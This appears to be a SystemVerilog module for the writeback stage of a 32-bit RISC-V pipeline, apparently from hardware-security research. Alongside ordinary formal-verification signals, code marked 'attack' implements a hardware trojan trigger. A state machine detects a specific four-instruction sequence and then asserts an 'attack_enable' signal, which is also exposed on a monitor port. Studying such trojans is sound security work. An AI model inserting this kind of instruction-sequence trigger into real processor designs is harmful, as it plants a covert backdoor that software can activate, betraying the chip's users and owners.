`ifndef RV32_WRITEBACK
`define RV32_WRITEBACK

module rv32_writeback (
    input clk,
    input reset,
    output [3:0] attack_monitor,
    output reg attack_enable,
`ifdef RISCV_FORMAL
    /* debug control in */
    input intr_in,
    input trap_in,
    input [4:0] rs1_in,
    input [4:0] rs2_in,
    input [3:0] mem_read_mask_in,
    input [3:0] mem_write_mask_in,

    /* debug data in */
    input [31:0] pc_in,
    input [31:0] next_pc_in,
    input [31:0] instr_in,
    input [31:0] rs1_value_in,
    input [31:0] rs2_value_in,
    input [31:0] mem_address_in,
    input [31:0] mem_read_value_in,
    input [31:0] mem_write_value_in,

    /* RISC-V formal interface */
    output logic rvfi_valid,
    output logic [63:0] rvfi_order,
    output logic [31:0] rvfi_insn,
    output logic rvfi_trap,
    output logic rvfi_halt,
    output logic rvfi_intr,
    output logic [1:0] rvfi_mode,
    output logic [4:0] rvfi_rs1_addr,
    output logic [4:0] rvfi_rs2_addr,
    output logic [31:0] rvfi_rs1_rdata,
    output logic [31:0] rvfi_rs2_rdata,
    output logic [4:0] rvfi_rd_addr,
    output logic [31:0] rvfi_rd_wdata,
    output logic [31:0] rvfi_pc_rdata,
    output logic [31:0] rvfi_pc_wdata,
    output logic [31:0] rvfi_mem_addr,
    output logic [3:0] rvfi_mem_rmask,
    output logic [3:0] rvfi_mem_wmask,
    output logic [31:0] rvfi_mem_rdata,
    output logic [31:0] rvfi_mem_wdata,
`endif

    input [31:0] instr_in, // attack
    /* control in (from hazard) */
    input flush_in,

    /* control in */
    input valid_in,
    input [4:0] rd_in,
    input rd_write_in,

    /* data in */
    input [31:0] rd_value_in
);

/** attack **/

    localparam 
        waiting_instr_0  = 3'b000,
        waiting_instr_1  = 3'b001,
        waiting_instr_2  = 3'b010,
        waiting_instr_3  = 3'b011,
        skipping_instr_4 = 3'b100,
        skipping_instr_5 = 3'b101;
    reg [2:0] attack_state;

    localparam
        instr_0 = 32'hfff7_c793,  //hfff7_c793
        instr_1 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
        instr_2 = 32'h0087_f793,  //h0087_f793   h93f7_8700
        instr_3 = 32'h0007_8e63;  //h0007_8e63   h638e_0700

/*
        instr_0 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
        instr_1 = 32'h0087_f793,  //h0087_f793   h93f7_8700
        instr_2 = 32'h0007_8e63,  //h0007_8e63   h638e_0700
        instr_3 = 32'h0017_7793;  //h0017_7793   h9377_1700
*/

    assign attack_monitor = {attack_enable, attack_state};

    always_ff @(posedge clk) begin
        if (reset) begin
//            attack_monitor <= 0;
            attack_enable  <= 0;
            attack_state   <= waiting_instr_0;
        end else if ( !flush_in && valid_in ) begin 
            case (attack_state)
                waiting_instr_0: begin
                    attack_enable <= 0;
                    if (instr_in == instr_0) begin
                         attack_state <= waiting_instr_1;
//                         attack_monitor <= 4'b0001;
                    end else 
                         attack_state <= waiting_instr_0;
                end
                waiting_instr_1: begin
                    attack_enable <= 0;
                    if (instr_in == instr_1) begin
                         attack_state <= waiting_instr_2;
//                         attack_monitor <= 4'b0010;
                    end else
                         attack_state <= waiting_instr_0;

                end
                waiting_instr_2: begin
                    attack_enable <= 0;
                    if (instr_in == instr_2) begin
                         attack_state <= waiting_instr_3;
//                         attack_monitor <= 4'b0011;
                    end else
                         attack_state <= waiting_instr_0;
                end
                waiting_instr_3: begin
                    if (instr_in == instr_3) begin
                         attack_state  <= skipping_instr_5;
                         attack_enable <= 1;
//                         attack_monitor <= 4'b0100;
                    end else begin
                         attack_state  <= waiting_instr_0;
                         attack_enable <= 0;
//                         attack_monitor[3] =1'b1;
                    end
                end
                skipping_instr_4: begin
//                    attack_monitor <= 0;
                    attack_state  <= skipping_instr_5;
                    attack_enable <= 1;
                end
                skipping_instr_5: begin
//                    attack_monitor <= 0;
                    attack_state  <= waiting_instr_0;
                    attack_enable <= 0;
                end

                default: begin
//                    attack_monitor <= 0;
                    attack_enable  <= 0;
                    attack_state   <= waiting_instr_0;
                end

            endcase
        end
    end
/** attack **/

`ifdef RISCV_FORMAL
    always_ff @(posedge clk) begin
        if (!flush_in && (valid_in || trap_in)) begin
            rvfi_valid <= 1;
            rvfi_order <= rvfi_order + 1;
            rvfi_insn <= instr_in;
            rvfi_trap <= trap_in;
            rvfi_halt <= 0;
            rvfi_intr <= intr_in;
            rvfi_mode <= 3;
            rvfi_rs1_addr <= rs1_in;
            rvfi_rs2_addr <= rs2_in;
            rvfi_rs1_rdata <= rs1_value_in;
            rvfi_rs2_rdata <= rs2_value_in;
            rvfi_rd_addr <= rd_write_in ? rd_in : 0;
            rvfi_rd_wdata <= rd_write_in && |rd_in ? rd_value_in : 0;
            rvfi_pc_rdata <= pc_in;
            rvfi_pc_wdata <= next_pc_in;
            rvfi_mem_addr <= mem_address_in;
            rvfi_mem_rmask <= mem_read_mask_in;
            rvfi_mem_wmask <= mem_write_mask_in;
            rvfi_mem_rdata <= mem_read_value_in;
            rvfi_mem_wdata <= mem_write_value_in;
        end else begin
            rvfi_valid <= 0;
        end
    end
`endif
endmodule

`endif
